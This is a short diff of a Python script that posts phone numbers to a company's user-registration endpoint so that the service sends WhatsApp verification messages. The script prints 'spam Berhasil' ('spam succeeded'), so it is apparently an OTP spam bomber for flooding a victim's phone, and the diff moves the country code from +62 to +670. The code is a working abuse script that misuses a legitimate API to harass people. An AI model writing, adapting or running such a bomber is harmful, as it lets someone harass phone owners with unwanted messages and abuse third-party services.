@@ -31,7 +31,7 @@ head = {
 "accept-encoding": "gzip, deflate, br",
 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-dat = json.dumps({"phone_number":"+62"+no,"channel":"WA"})
+dat = json.dumps({"phone_number":"+670"+no,"channel":"WA"})
 kon = requests.post('https://api.qoalaplus.com/go-agent/v2/user/register',headers=head,data=dat).text
 if "success" in kon:
         print('=> spam Berhasil ')
